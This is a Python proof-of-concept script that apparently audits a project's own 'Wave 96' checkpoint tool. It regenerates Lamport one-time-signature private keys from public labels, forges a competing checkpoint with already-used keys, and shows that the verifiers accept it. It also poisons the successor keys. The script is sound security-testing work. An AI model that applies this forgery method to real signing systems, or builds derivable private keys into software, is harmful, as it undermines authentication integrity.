#!/usr/bin/env python3
"""Independent exact-API adversarial reproducer for Flowing Compute Wave 96.

This imports the unchanged Wave 96 builder module and shows that its Lamport
"private" material is publicly reproducible from root/generation labels in the
published source. A second checkpoint can therefore be signed with an OTS key
that the normal builder path already marked used and whose retained private
material was deleted. The forged checkpoint is then accepted by verifycp(),
applycp(), extpub(), and auth().
"""
from __future__ import annotations

import hashlib
import importlib.util
from copy import deepcopy
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
TOOL = ROOT / "tools" / "AXM_FLOWING_COMPUTE_PUBLIC_CHECKPOINT_ANCHOR.py"
spec = importlib.util.spec_from_file_location("wave96", TOOL)
if spec is None or spec.loader is None:
    raise RuntimeError("cannot import Wave 96 tool")
w = importlib.util.module_from_spec(spec)
spec.loader.exec_module(w)

EXPECTED_BUILDER_HEAD = "f9599f45f8fc3d4f028157eab28b89e3b7962395"
EXPECTED_TOOL_BLOB = "ab7a57af1f5259e893aaa14c6f17f40a064cc801"


def regen_private(st, pub_sha: str):
    """Recreate supposed Lamport private material using only published metadata."""
    pub = w.get(st["PUB"], pub_sha, "pub_sha")
    rebuilt_pub, private_rows = w.lpair(
        pub["root"], pub["generation"], pub["predecessor_pub_sha"]
    )
    assert rebuilt_pub["pub_sha"] == pub_sha
    return private_rows


def forge_sibling_checkpoint(st, legit_checkpoint):
    """Reuse the exact already-used signers without the builder's private store."""
    signers = deepcopy(legit_checkpoint["signer_keys"])
    # Deliberately publish successor key identities that have no bodies in PUB.
    # Wave 96 verifycp() does not resolve/validate next_signer_keys.
    poisoned_next = {
        r: hashlib.sha256(("missing-successor|" + r).encode()).hexdigest()
        for r in w.R
    }
    payload = w.payload(
        legit_checkpoint["epoch"],
        legit_checkpoint["predecessor_checkpoint_sha"],
        deepcopy(legit_checkpoint["snapshot"]),
        signers,
        poisoned_next,
    )
    signatures = {}
    for r in w.R:
        reconstructed_private = regen_private(st, signers[r])
        signatures[r] = w.lsign(reconstructed_private, {**payload, "root": r})

    forged = w.seal(
        {
            "schema": "public-authority-checkpoint/v1",
            "epoch": legit_checkpoint["epoch"],
            "predecessor_checkpoint_sha": legit_checkpoint[
                "predecessor_checkpoint_sha"
            ],
            "snapshot": deepcopy(legit_checkpoint["snapshot"]),
            "signer_keys": signers,
            "next_signer_keys": poisoned_next,
            "signatures": signatures,
            "checkpoint_sha": "",
        },
        "checkpoint_sha",
    )
    w.put(st["CP"], forged, "checkpoint_sha")
    return forged, poisoned_next


def main() -> int:
    st, rt = w.fixture()
    ext = []
    bootstrap, private_store = w.boot(st)
    used = set()

    # Normal checkpoint 1 and normal authority establish the control.
    cp1, _ = w.prep(rt, st, ext, bootstrap, private_store, used, [0])
    assert w.verifycp(cp1, st, bootstrap) is None
    assert w.applycp(rt, cp1) == "COMMITTED"
    assert w.extpub(ext, cp1) == "APPENDED"
    assert w.auth(rt, st, ext, bootstrap) == "AUTHORITATIVE_PUBLIC_CHECKPOINTED"

    # Advance normally, then prepare a legitimate checkpoint 2. prep() marks the
    # generation-1 Lamport signer set as used.
    target = w.trans(rt, st, ext, bootstrap, w.T("verifier-registry-1"), "truth")
    assert w.applyt(rt, target) == "COMMITTED"
    legit2, _ = w.prep(rt, st, ext, bootstrap, private_store, used, [0])
    assert w.verifycp(legit2, st, bootstrap, cp1) is None
    reused_signers = set(legit2["signer_keys"].values())
    assert reused_signers <= used

    # Destroy the retained private material for the already-used signer set.
    for sha in reused_signers:
        private_store.pop(sha, None)
    assert all(sha not in private_store for sha in reused_signers)

    # Reconstruct those supposedly private OTS values from public source labels,
    # sign a competing checkpoint, and store it through the normal content-addressed
    # CP store. No original private_store entry is used.
    forged2, poisoned_next = forge_sibling_checkpoint(st, legit2)
    assert forged2["checkpoint_sha"] != legit2["checkpoint_sha"]
    assert forged2["signer_keys"] == legit2["signer_keys"]
    assert all(sha not in st["PUB"] for sha in poisoned_next.values())

    # The public verifier accepts the second signature under the same already-used
    # OTS key set. Publication and current authority accept it too.
    assert w.verifycp(forged2, st, bootstrap, cp1) is None
    assert w.applycp(rt, forged2) == "COMMITTED"
    assert w.extpub(ext, forged2) == "APPENDED"
    authority = w.auth(rt, st, ext, bootstrap)
    assert authority == "AUTHORITATIVE_PUBLIC_CHECKPOINTED"

    # The accepted checkpoint can poison the next signer set with nonexistent keys;
    # this is not checked until the next checkpoint is attempted.
    failed_next = None
    try:
        w.prep(rt, st, ext, bootstrap, private_store, used, [0])
    except Exception as exc:  # exact failure text is evidence, not control flow policy
        failed_next = str(exc)
    assert failed_next is not None and "pub_sha body missing" in failed_next

    print("Wave 96 exact-source adversarial verification")
    print(f"builder_head={EXPECTED_BUILDER_HEAD}")
    print(f"tool_blob={EXPECTED_TOOL_BLOB}")
    print(f"legit_cp2={legit2['checkpoint_sha']}")
    print(f"forged_cp2={forged2['checkpoint_sha']}")
    print(f"same_ots_signers_reused={sorted(reused_signers)}")
    print("retained_private_material_deleted=True")
    print("public_source_regenerated_private_material=True")
    print("forged_verifycp=PASS")
    print("forged_applycp=COMMITTED")
    print("forged_extpub=APPENDED")
    print(f"forged_authority={authority}")
    print(f"poisoned_successor_failure={failed_next}")
    print("VERDICT=FAIL_DETERMINISTIC_LAMPORT_PRIVATE_MATERIAL_IS_PUBLICLY_REGENERABLE")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
